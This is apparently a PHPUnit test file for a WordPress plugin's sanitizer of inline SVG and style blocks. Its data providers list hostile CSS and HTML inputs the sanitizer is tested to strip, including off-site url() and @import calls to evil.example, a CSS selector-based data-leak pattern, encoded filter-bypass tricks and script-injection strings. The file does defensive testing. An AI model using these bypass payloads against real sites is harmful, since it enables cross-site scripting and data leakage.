<?php
declare( strict_types=1 );

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

require_once __DIR__ . '/stubs-cache.php';

/**
 * The inline SVG and style opt-in (1.15.0): the setting, the allowlist and the
 * style-body rules. filter() needs WordPress' tokenizer and real kses, so the
 * hostile payloads run on a live site: tests/wp-env/elementor-sanitize-live.py.
 */
final class InlineMarkupTest extends TestCase {

	protected function setUp(): void {
		unset( IATO_Test_Abilities_State::$options[ IATO_MCP_Inline_Markup::OPTION ] );
		IATO_Test_OAuth_State::$home_url = 'https://site.example';
	}

	// ── The setting ───────────────────────────────────────────────────────

	public function test_off_by_default(): void {
		$this->assertFalse( IATO_MCP_Inline_Markup::is_enabled() );
		$this->assertSame( IATO_MCP_Inline_Markup::STRIPPED_SETTING_OFF, IATO_MCP_Inline_Markup::policy() );
	}

	public function test_on_needs_the_tokenizer_before_anything_else(): void {
		IATO_Test_Abilities_State::$options[ IATO_MCP_Inline_Markup::OPTION ] = '1';
		$this->assertTrue( IATO_MCP_Inline_Markup::is_enabled() );
		if ( class_exists( 'WP_HTML_Tag_Processor' ) ) {
			$this->markTestSkipped( 'WordPress is loaded' );
		}
		$this->assertSame( IATO_MCP_Inline_Markup::STRIPPED_WP_VERSION, IATO_MCP_Inline_Markup::policy() );
	}

	// ── The allowlist ─────────────────────────────────────────────────────

	public function test_only_the_elements_asked_for(): void {
		$this->assertSame( [ 'svg', 'g', 'path', 'rect', 'circle', 'line', 'polyline', 'polygon', 'title' ], array_keys( IATO_MCP_Inline_Markup::svg_allowlist() ) );
	}

	public function test_no_scripting_or_url_attribute_is_allowed_anywhere(): void {
		foreach ( IATO_MCP_Inline_Markup::svg_allowlist() as $element => $attributes ) {
			foreach ( array_keys( $attributes ) as $attribute ) {
				$this->assertSame( strtolower( (string) $attribute ), (string) $attribute, "{$element}: wp_kses compares lowercased names" );
				$this->assertStringStartsNotWith( 'on', (string) $attribute, $element );
				$this->assertNotContains( $attribute, [ 'href', 'xlink:href', 'src', 'action', 'formaction', 'begin', 'to', 'from', 'values', 'attributename' ], $element );
			}
		}
	}

	public function test_viewbox_is_allowed_under_its_lowercase_name(): void {
		$this->assertArrayHasKey( 'viewbox', IATO_MCP_Inline_Markup::svg_allowlist()['svg'] );
	}

	public function test_inline_markup_is_style_or_svg(): void {
		$this->assertTrue( IATO_MCP_Inline_Markup::has_inline_markup( '<p>a</p><STYLE>a{}</STYLE>' ) );
		$this->assertTrue( IATO_MCP_Inline_Markup::has_inline_markup( '<SVG></SVG>' ) );
		$this->assertFalse( IATO_MCP_Inline_Markup::has_inline_markup( '<p title="<svg>">a</p>' ), 'an attribute value is not a tag' );
		$this->assertFalse( IATO_MCP_Inline_Markup::has_inline_markup( '<!-- <style></style> --><path d="M0"/>' ) );
	}

	// ── Style bodies ──────────────────────────────────────────────────────

	/** @return array<string,array{0:string,1:string,2:string[]}> */
	public static function kept_css(): array {
		return [
			'plain rule'           => [ '.a > .b { color: red }', '.a > .b { color: red }', [] ],
			'media query'          => [ '@media (min-width: 1px) { a { color: red } }', '@media (min-width: 1px) { a { color: red } }', [] ],
			'font face same host'  => [ '@font-face { src: url(/f.woff2) }', '@font-face { src: url(/f.woff2) }', [] ],
			'fragment'             => [ 'a { fill: url(#g) }', 'a { fill: url(#g) }', [] ],
			'relative'             => [ 'a { background: url(img/a.png) }', 'a { background: url(img/a.png) }', [] ],
			'this host'            => [ 'a { background: url("https://site.example/a.png") }', 'a { background: url("https://site.example/a.png") }', [] ],
			'www of this host'     => [ "a { background: url('https://www.site.example/a.png') }", "a { background: url('https://www.site.example/a.png') }", [] ],
			'protocol relative'    => [ 'a { background: url(//site.example/a.png) }', 'a { background: url(//site.example/a.png) }', [] ],
			'inline image'         => [ 'a { background: url(data:image/png;base64,AAAA) }', 'a { background: url(data:image/png;base64,AAAA) }', [] ],
			'comment removed'      => [ 'a{}/* note */b{}', 'a{} b{}', [] ],
			'nesting selector'     => [ 'a { &:hover { color: red } & b { color: blue } }', 'a { &:hover { color: red } & b { color: blue } }', [] ],
			'attribute selector'   => [ 'a[href^="https://other.example/"] { color: red }', 'a[href^="https://other.example/"] { color: red }', [] ],
			'plain text with colon' => [ 'a::after { content: "Note: see https://x" }', 'a::after { content: "Note: see https://x" }', [] ],
			'font face'            => [ '@font-face { font-family: "Foo"; src: local("Foo: Bar"), url(/f.woff2) format("woff2") }', '@font-face { font-family: "Foo"; src: local("Foo: Bar"), url(/f.woff2) format("woff2") }', [] ],
			'gradient in image-set' => [ 'a { background: image-set(linear-gradient(red, blue) 1x) }', 'a { background: image-set(linear-gradient(red, blue) 1x) }', [] ],
			'scroll-behavior'      => [ 'html { scroll-behavior: smooth }', 'html { scroll-behavior: smooth }', [] ],
			'overscroll-behavior'  => [ 'a { overscroll-behavior: none }', 'a { overscroll-behavior: none }', [] ],
			'unicode escape'       => [ 'a::after { content: "\2014" }', 'a::after { content: "\2014" }', [] ],
			'image-set this host'  => [ 'a { background: image-set("/a.png" 1x) }', 'a { background: image-set("/a.png" 1x) }', [] ],
		];
	}

	#[DataProvider( 'kept_css' )]
	public function test_css_that_is_kept( string $in, string $out, array $removed ): void {
		$this->assertSame( [ 'css' => $out, 'removed' => $removed ], IATO_MCP_Inline_Markup::sanitize_css( $in ) );
	}

	/** @return array<string,array{0:string,1:string,2:string[]}> */
	public static function stripped_css(): array {
		return [
			'import url'           => [ '@import url(https://evil.example/x.css); a{}', 'a{}', [ '@import url(https://evil.example/x.css);' ] ],
			'import string'        => [ '@import "x.css"; a{}', 'a{}', [ '@import "x.css";' ] ],
			'IMPORT case'          => [ '@IMPORT "x.css"; a{}', 'a{}', [ '@IMPORT "x.css";' ] ],
			'import rejoined'      => [ '@im@import x;port "https://evil.example/B.css";', '@im port "";', [ '@import x;', '"https://evil.example/B.css"' ] ],
			'off-site url'         => [ 'a { background: url(https://evil.example/a.png) }', 'a { background: none }', [ 'url(https://evil.example/a.png)' ] ],
			'quoted off-site'      => [ 'a { background: url( "https://evil.example/a.png" ) }', 'a { background: none }', [ 'url( "https://evil.example/a.png" )' ] ],
			'protocol relative'    => [ 'a { background: url(//evil.example/a.png) }', 'a { background: none }', [ 'url(//evil.example/a.png)' ] ],
			'backslash trick'      => [ 'a { background: url(/\\\\evil.example/a.png) }', 'a { background: none }', [ 'url(/\\\\evil.example/a.png)' ] ],
			'hex slashes'          => [ 'a { background: url(\2f\2f evil.example/a.png) }', 'a { background: none }', [ 'url(\2f\2f evil.example/a.png)' ] ],
			'keeps the selector'   => [ 'input[value^="s"] { background: url(https://evil.example/leak?p=s) }', 'input[value^="s"] { background: none }', [ 'url(https://evil.example/leak?p=s)' ] ],
			'font face off-site'   => [ '@font-face { font-family: x; src: url(https://evil.example/f.woff) }', '@font-face { font-family: x; src: none }', [ 'url(https://evil.example/f.woff)' ] ],
			'nested image-set'     => [ 'a { background: image-set("https://evil.example/p.png" 1x, linear-gradient(rgb(0,0,0),red) 2x) }', 'a { background: none }', [ 'image-set("https://evil.example/p.png" 1x, linear-gradient(rgb(0,0,0),red) 2x)' ] ],
			'parens in a filename' => [ 'a { background: image-set("https://evil.example/F(a(b)c).png" 1x) }', 'a { background: none }', [ 'image-set("https://evil.example/F(a(b)c).png" 1x)' ] ],
			'var indirection'      => [ 'a { --u: "https://evil.example/G.png"; background: image-set(var(--u) 1x) }', 'a { --u: ""; background: none }', [ '"https://evil.example/G.png"', 'image-set(var(--u) 1x)' ] ],
			'if indirection'       => [ 'a { background: image-set(if(style(--a:1):"https://evil.example/X.png";else:"y") 1x) }', 'a { background: none }', [ 'image-set(if(style(--a:1):"https://evil.example/X.png";else:"y") 1x)' ] ],
			'src function'         => [ 'a { background: src("https://evil.example/a.png") }', 'a { background: none }', [ 'src("https://evil.example/a.png")' ] ],
			'cross-fade'           => [ 'a { background: -webkit-cross-fade(url(https://evil.example/a.png), url(/b.png), 50%) }', 'a { background: none }', [ '-webkit-cross-fade(url(https://evil.example/a.png), url(/b.png), 50%)' ] ],
			'other scheme'         => [ 'a { background: url(ftp://site.example/a) }', 'a { background: none }', [ 'url(ftp://site.example/a)' ] ],
			'data but not image'   => [ 'a { background: url(data:text/html,x) }', 'a { background: none }', [ 'url(data:text/html,x)' ] ],
			'lookalike host'       => [ 'a { background: url(https://site.example.evil.example/a) }', 'a { background: none }', [ 'url(https://site.example.evil.example/a)' ] ],
			'image-set off-site'   => [ 'a { background: image-set("https://evil.example/a.png" 1x) }', 'a { background: none }', [ 'image-set("https://evil.example/a.png" 1x)' ] ],
			'-webkit-image-set'    => [ 'a { background: -webkit-image-set(url(https://evil.example/a.png) 1x) }', 'a { background: none }', [ '-webkit-image-set(url(https://evil.example/a.png) 1x)' ] ],
		];
	}

	#[DataProvider( 'stripped_css' )]
	public function test_css_that_loses_a_part( string $in, string $out, array $removed ): void {
		$this->assertSame( [ 'css' => $out, 'removed' => $removed ], IATO_MCP_Inline_Markup::sanitize_css( $in ) );
	}

	/** @return array<string,array{0:string}> */
	public static function dropped_css(): array {
		return [
			'markup'               => [ 'a{} <img src=x onerror=alert(1)>' ],
			'closing tag'          => [ 'a{}</style><script>alert(1)</script>' ],
			'bare less than'       => [ 'a{content:"<"}' ],
			'expression'           => [ 'a { width: expression(alert(1)) }' ],
			'expression spaced'    => [ 'a { width: EXPRESSION (alert(1)) }' ],
			'behavior'             => [ 'a { behavior: url(x.htc) }' ],
			'moz binding'          => [ 'a { -moz-binding: url(x.xml) }' ],
			'javascript url'       => [ 'a { background: url(javascript:alert(1)) }' ],
			'vbscript url'         => [ 'a { background: url(vbscript:x) }' ],
			'escaped less than'    => [ 'a{content:"\3c"}' ],
			'escaped javascript'   => [ 'a { background: url(java\73 cript:alert(1)) }' ],
			'escaped expression'   => [ 'a { width: e\78 pression(alert(1)) }' ],
			'escaped import'       => [ '\40 import "https://evil.example/x.css";' ],
			'escaped url'          => [ 'a { background: \75 rl(https://evil.example/a.png) }' ],
			'comment split'        => [ 'a { width: expre/**/ssion(alert(1)) }' ],
			'char escaped at sign' => [ 'a{}\@import "https://evil.example/x.css";' ],
			'tab in a url'         => [ "a { background: url(/\t/evil.example/a.png) }" ],
			'unterminated url'     => [ 'body{background:url(https://evil.example/A.png' ],
			'unterminated quoted'  => [ 'body{background:url("https://evil.example/M.png' ],
			'unterminated image-set' => [ 'a{background:image-set("https://evil.example/E.png" 1x' ],
			'unterminated comment' => [ 'a{} /* x' ],
			'newline in a string'  => [ "a{content:\"x\ny\"}" ],
			'text url( as a shield' => [ 'a{--x:"url(";background:url(https://evil.example/C.png)}' ],
			'numeric reference'    => [ '@&#105;mport "https://evil.example/x.css";' ],
			'reference in url'     => [ 'a{background:ur&#108;(https://evil.example/p.png)}' ],
			'named reference'      => [ '&commat;import "https://evil.example/x.css";' ],
			'null byte'            => [ "a{}\0@import 'x';" ],
			'invalid utf-8'        => [ "a{content:\"\xFF\"}" ],
		];
	}

	#[DataProvider( 'dropped_css' )]
	public function test_css_that_loses_the_whole_block( string $in ): void {
		$r = IATO_MCP_Inline_Markup::sanitize_css( $in );
		$this->assertNull( $r['css'], $in );
		$this->assertStringStartsWith( 'whole <style> block', (string) end( $r['removed'] ) );
	}

	public function test_a_large_inline_image_is_not_a_problem(): void {
		$css = 'a{color:red} b{background:image-set("data:image/png;base64,' . str_repeat( 'A', 200000 ) . '" 1x)}';
		$this->assertSame( [ 'css' => $css, 'removed' => [] ], IATO_MCP_Inline_Markup::sanitize_css( $css ) );
		$url = 'a{background:url(data:image/png;base64,' . str_repeat( 'A', 200000 ) . ')}';
		$this->assertSame( [ 'css' => $url, 'removed' => [] ], IATO_MCP_Inline_Markup::sanitize_css( $url ) );
	}

	public function test_a_body_with_nothing_left_is_no_block(): void {
		$this->assertSame( [ 'css' => null, 'removed' => [] ], IATO_MCP_Inline_Markup::sanitize_css( '  /* just a note */  ' ) );
		$this->assertSame( [ 'css' => null, 'removed' => [ '@import "x";' ] ], IATO_MCP_Inline_Markup::sanitize_css( '@import "x";' ) );
	}

	// ── post_content ──────────────────────────────────────────────────────

	public function test_style_blocks_are_taken_out_of_saved_content(): void {
		$this->assertSame( '<p>a</p><p>b</p>', IATO_MCP_Inline_Markup::strip_style_blocks( '<p>a</p><STYLE media=\"print\">x{}</style ><p>b</p>' ) );
		$this->assertSame( '<p>a</p>', IATO_MCP_Inline_Markup::strip_style_blocks( '<p>a</p>' ) );
		$this->assertNull( IATO_MCP_Inline_Markup::strip_style_blocks( null ) );
	}

	public function test_the_content_filter_is_there_only_when_the_tree_holds_a_style_block(): void {
		IATO_Test_Abilities_State::$filters = [];
		$seen = null;
		$out  = IATO_MCP_Inline_Markup::write_without_style_in_content( '[{"html":"<p>a</p>"}]', function () use ( &$seen ) { $seen = IATO_Test_Abilities_State::$filters['content_save_pre'] ?? []; return 'one'; } );
		$this->assertSame( 'one', $out );
		$this->assertSame( [], $seen );

		// Setting off here: a block stored earlier stays in the tree all the same.
		$out = IATO_MCP_Inline_Markup::write_without_style_in_content( '[{"html":"<STYLE>a{}</STYLE>"}]', function () use ( &$seen ) { $seen = IATO_Test_Abilities_State::$filters['content_save_pre'] ?? []; return 'two'; } );
		$this->assertSame( 'two', $out );
		$this->assertSame( [ [ IATO_MCP_Inline_Markup::class, 'strip_style_blocks' ] ], $seen );
		IATO_Test_Abilities_State::$filters = [];
	}
}
